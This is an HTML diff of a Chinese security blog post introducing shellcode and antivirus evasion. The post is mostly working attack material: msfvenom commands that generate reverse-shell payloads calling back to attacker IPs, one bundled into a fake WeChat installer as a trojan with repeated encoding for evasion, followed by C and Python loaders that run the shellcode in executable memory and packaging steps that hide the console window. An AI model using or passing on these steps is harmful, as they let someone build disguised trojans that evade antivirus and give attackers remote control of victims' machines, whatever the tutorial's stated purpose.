@@ -1,102 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    ShellCode和免杀入门 丨
+    
+
+    Le0
+  </title>
+
   
+  <link rel="shortcut icon" href="/icon.svg">
   
-  <title>ShellCode和免杀入门 | Leo的随便写写</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="何为shellcodeShellcode是一种以机器代码形式存在的小段指令，通常用于在目标系统中执行特定操作，最初主要是用来在系统上获取一个“shell”访问权限（即控制终端）。其广泛用于渗透测试和漏洞利用，也用于在应用程序或操作系统中触发特定的操作。 shellcode奏效流程常shellcode确实需要嵌入或打包在一个可执行程序中才能运行。Shellcode本质上是一段机器指令，而操作系统不会">
-<meta property="og:type" content="article">
-<meta property="og:title" content="ShellCode和免杀入门">
-<meta property="og:url" content="http://example.com/2024/11/21/shellcode/index.html">
-<meta property="og:site_name" content="Leo的随便写写">
-<meta property="og:description" content="何为shellcodeShellcode是一种以机器代码形式存在的小段指令，通常用于在目标系统中执行特定操作，最初主要是用来在系统上获取一个“shell”访问权限（即控制终端）。其广泛用于渗透测试和漏洞利用，也用于在应用程序或操作系统中触发特定的操作。 shellcode奏效流程常shellcode确实需要嵌入或打包在一个可执行程序中才能运行。Shellcode本质上是一段机器指令，而操作系统不会">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/shellcode/shell1.png">
-<meta property="article:published_time" content="2024-11-21T01:01:25.000Z">
-<meta property="article:modified_time" content="2024-11-21T01:18:14.460Z">
-<meta property="article:author" content="Leo">
-<meta property="article:tag" content="安全技术">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/shellcode/shell1.png">
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
   
-    <link rel="alternate" href="/atom.xml" title="Leo的随便写写" type="application/atom+xml">
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
   
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
   
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+<link rel="stylesheet" href="/css/root.css">
+
   
 <link rel="stylesheet" href="/css/style.css">
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+<link rel="stylesheet" href="/css/post.css">
 
-  
-  
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Leo的随便写写</a>
-      </h1>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">Leo的随便写写</a>
+    <ul class="nav">
       
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
+      <li><a href="/archives">archives</a></li>
+      
+    </ul>
+  </section>
 </header>
-
-      <div class="outer">
-        <section id="main"><article id="post-shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/11/21/shellcode/" class="article-date">
-  <time class="dt-published" datetime="2024-11-21T01:01:25.000Z" itemprop="datePublished">2024-11-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+  <main class="main">
+    <article class="post">
   
-    <h1 class="p-name article-title" itemprop="headline name">
-      ShellCode和免杀入门
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
+  <div class="post-title">ShellCode和免杀入门</div>
+  <div class="post-meta">
+    <div class="date">2024 November 21st</div>
+    <div class="tags">
       
-        <h4 id="何为shellcode"><a href="#何为shellcode" class="headerlink" title="何为shellcode"></a>何为shellcode</h4><p><strong>Shellcode</strong>是一种以机器代码形式存在的小段指令，通常用于在目标系统中执行特定操作，最初主要是用来在系统上获取一个“shell”访问权限（即控制终端）。其广泛用于渗透测试和漏洞利用，也用于在应用程序或操作系统中触发特定的操作。</p>
+      <div class="tag-item">安全技术</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h4 id="何为shellcode"><a href="#何为shellcode" class="headerlink" title="何为shellcode"></a>何为shellcode</h4><p><strong>Shellcode</strong>是一种以机器代码形式存在的小段指令，通常用于在目标系统中执行特定操作，最初主要是用来在系统上获取一个“shell”访问权限（即控制终端）。其广泛用于渗透测试和漏洞利用，也用于在应用程序或操作系统中触发特定的操作。</p>
 <h5 id="shellcode奏效流程"><a href="#shellcode奏效流程" class="headerlink" title="shellcode奏效流程"></a>shellcode奏效流程</h5><p>常shellcode确实需要嵌入或打包在一个可执行程序中才能运行。Shellcode本质上是一段机器指令，而操作系统不会直接运行二进制数据；它需要一个载体程序来将其加载到内存中，并赋予它相应的权限。<br><strong>一般情况下，shellcode的执行流程如下</strong>：</p>
 <ol>
 <li><strong>载体程序</strong>：创建一个可执行程序（通常是C&#x2F;C++编写的程序），使用系统调用（如VirtualAlloc、mprotect等）来分配可执行的内存空间。</li>
@@ -106,23 +73,92 @@
 <h5 id="shellcode生成"><a href="#shellcode生成" class="headerlink" title="shellcode生成"></a>shellcode生成</h5><ul>
 <li>msf 生成shellcode –产生一段shellcode在c文件中</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=10.10.20.67 LPORT=8888 -e x86/shikata_ga_nai -i 15 -b &#x27;\x00\&#x27; PrependMigrate=true PrependMigrateProc=svchost.exe -f c &gt; shellcode.c</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=10.10.20.67 LPORT=8888 -e x86/shikata_ga_nai -i 15 -b &#x27;\x00\&#x27; PrependMigrate=true PrependMigrateProc=svchost.exe -f c &gt; shellcode.c</code></pre>
 
 <p><img src="/images/shellcode/shell1.png" alt="长这样"></p>
 <ul>
 <li>msf 生成执行木马 —- 相当于已经打包好</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoders</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.111.132 LPORT=9999 -e x86/shikata_ga_nai -x WeChatSetup.exe -i 12 -f exe -o /root/WeChatSetup1.exe</span><br><span class="line"></span><br><span class="line">-e /指定编码方式对攻击载荷进行重新编码</span><br><span class="line"></span><br><span class="line">-x /指定木马捆绑在哪个可执行程序模板上</span><br><span class="line"></span><br><span class="line">-i /指定对目标进行编码的次数，多次编码理论上有助于免杀的实现</span><br><span class="line"></span><br><span class="line">-f /指定msf编码器输出程序的格式</span><br><span class="line"></span><br><span class="line">-0 /指定处理完毕后的文件输出路径</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">msfvenom -l encoders
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.111.132 LPORT=9999 -e x86/shikata_ga_nai -x WeChatSetup.exe -i 12 -f exe -o /root/WeChatSetup1.exe
+
+-e /指定编码方式对攻击载荷进行重新编码
+
+-x /指定木马捆绑在哪个可执行程序模板上
+
+-i /指定对目标进行编码的次数，多次编码理论上有助于免杀的实现
+
+-f /指定msf编码器输出程序的格式
+
+-0 /指定处理完毕后的文件输出路径</code></pre>
 
 <h4 id="shellcode打包"><a href="#shellcode打包" class="headerlink" title="shellcode打包"></a>shellcode打包</h4><h5 id="C打包"><a href="#C打包" class="headerlink" title="C打包"></a>C打包</h5><ul>
 <li>打包器–c lang 编译生成可执行文件</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[]= 这里填shellcode;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line"></span><br><span class="line">     LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">     memcpy(Memory, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">    ((void(*)())Memory)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext">#include&lt;stdio.h&gt;
+
+#include&lt;windows.h&gt;
+
+#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)
+
+unsigned char shellcode[]= 这里填shellcode;
+
+void main()&#123;
+
+     LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+     memcpy(Memory, shellcode, sizeof(shellcode));
+
+    ((void(*)())Memory)();
+
+&#125;</code></pre>
 
 <h5 id="python打包"><a href="#python打包" class="headerlink" title="python打包"></a>python打包</h5><ul>
 <li>python处理shellcode    主要使用ctypes库实现<br>1、申请内存  2、写入shellcode   3、运行shellcode</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">ctypes库是Python中用来调用系统动态链接库函数的模块，利用ctypes库可以调用C语言的动态链接库并向其传递函数</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">shellcode = bytearray(b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># 使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"># 申请内存，调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(</span><br><span class="line">    ctypes.c_int(0),  # 指向要分配的区域的起始地址的指针，值为null时指向系统保留其认为合适的区域</span><br><span class="line">    ctypes.c_int(len(shellcode)),  # 分配区域的大小</span><br><span class="line">    ctypes.c_int(0x3000),  # 内存分配的类型</span><br><span class="line">    ctypes.c_int(0x40),  # 要分配的页区域的内存保护，可读可写可执行</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中</span><br><span class="line">buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),  # 指向要将字节复制到的目标内存块的指针</span><br><span class="line">    buffer,  # 指向要从中复制字节的源内存块的指针</span><br><span class="line">    ctypes.c_int(len(shellcode))  # 从源复制到目标的字节数</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 创建一个线程从shellcode放置位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0)),  # 指向SECURITY_ATTRIBUTES结构的指针，线程安全属性</span><br><span class="line">    ctypes.c_int(0),  # 堆栈的初始大小</span><br><span class="line">    ctypes.c_void_p(ptr),  # 指向由线程执行的应用程序定义函数的指针</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0)),  # 指向要传递给线程的变量的指针</span><br><span class="line">    ctypes.c_int(0),  # 控制线程创建的标志，为0表示创建后，线程会立即运行</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))  # 指向接收线程标识符的变量的指针，如果此参数为NULL，则不返回线程标识符</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 等待创建线程运行完成</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">    ctypes.c_int(handle),  # 对象的句柄</span><br><span class="line">    ctypes.c_int(-1)  # 超时间隔，以毫秒为单位，将其设为负数，等待时间将成为无限等待，程序就不会结束</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<pre><code class="highlight plaintext"># -*-coding:utf-8 -*-
+&quot;&quot;&quot;
+ctypes库是Python中用来调用系统动态链接库函数的模块，利用ctypes库可以调用C语言的动态链接库并向其传递函数
+&quot;&quot;&quot;
+import ctypes
+
+shellcode = bytearray(b&#x27;&#x27;)
+
+# 使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是32位
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+
+# 申请内存，调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
+ptr = ctypes.windll.kernel32.VirtualAlloc(
+    ctypes.c_int(0),  # 指向要分配的区域的起始地址的指针，值为null时指向系统保留其认为合适的区域
+    ctypes.c_int(len(shellcode)),  # 分配区域的大小
+    ctypes.c_int(0x3000),  # 内存分配的类型
+    ctypes.c_int(0x40),  # 要分配的页区域的内存保护，可读可写可执行
+)
+
+# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
+buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(
+    ctypes.c_uint64(ptr),  # 指向要将字节复制到的目标内存块的指针
+    buffer,  # 指向要从中复制字节的源内存块的指针
+    ctypes.c_int(len(shellcode))  # 从源复制到目标的字节数
+)
+
+# 创建一个线程从shellcode放置位置首地址开始执行
+handle = ctypes.windll.kernel32.CreateThread(
+    ctypes.pointer(ctypes.c_int(0)),  # 指向SECURITY_ATTRIBUTES结构的指针，线程安全属性
+    ctypes.c_int(0),  # 堆栈的初始大小
+    ctypes.c_void_p(ptr),  # 指向由线程执行的应用程序定义函数的指针
+    ctypes.pointer(ctypes.c_int(0)),  # 指向要传递给线程的变量的指针
+    ctypes.c_int(0),  # 控制线程创建的标志，为0表示创建后，线程会立即运行
+    ctypes.pointer(ctypes.c_int(0))  # 指向接收线程标识符的变量的指针，如果此参数为NULL，则不返回线程标识符
+)
+
+# 等待创建线程运行完成
+ctypes.windll.kernel32.WaitForSingleObject(
+    ctypes.c_int(handle),  # 对象的句柄
+    ctypes.c_int(-1)  # 超时间隔，以毫秒为单位，将其设为负数，等待时间将成为无限等待，程序就不会结束
+)</code></pre>
 
 <h5 id="python—-可执行文件"><a href="#python—-可执行文件" class="headerlink" title="python—&gt;可执行文件"></a>python—&gt;可执行文件</h5><p><code>nuitka --standalone --onefile --windows-disable-console xx.py</code></p>
 <p><code>pyinstaller --onefile --noconsole your_script.py</code>  （py-》exe）</p>
@@ -143,151 +179,22 @@
 </ul>
 </li>
 </ol>
+</main>
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/11/21/shellcode/" data-id="cm3qo2dgz0004h5na1oe96nu9" data-title="ShellCode和免杀入门" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" rel="tag">安全技术</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2024/11/21/jndi%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          jndi注入
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2024/11/20/wp-timeclock-rce/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">wp_timeclock_rce</div>
-    </a>
-  
-</nav>
-
-  
 </article>
 
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
+<script src="/js/highlight.js"></script>
 
+  </main>
+  <footer class="footer">
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" rel="tag">安全技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/" rel="tag">随便写写</a></li></ul>
-    </div>
-  </div>
-
-
+  <span>Copyright © 2024 Le0</span>
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">安全技术</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">漏洞复现</a> <a href="/tags/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/" style="font-size: 10px;">随便写写</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2024/11/21/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">威胁情报</a>
-          </li>
-        
-          <li>
-            <a href="/2024/11/21/smtp%E6%B3%A8%E5%85%A5/">smtp注入</a>
-          </li>
-        
-          <li>
-            <a href="/2024/11/21/jndi%E6%B3%A8%E5%85%A5/">jndi注入</a>
-          </li>
-        
-          <li>
-            <a href="/2024/11/21/shellcode/">ShellCode和免杀入门</a>
-          </li>
-        
-          <li>
-            <a href="/2024/11/20/wp-timeclock-rce/">wp_timeclock_rce</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2024 Leo<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
 </footer>
-
-    </div>
-    <nav id="mobile-nav">
   
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
+<script src="/js/theme.js"></script>
 
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
 </body>
+
 </html>
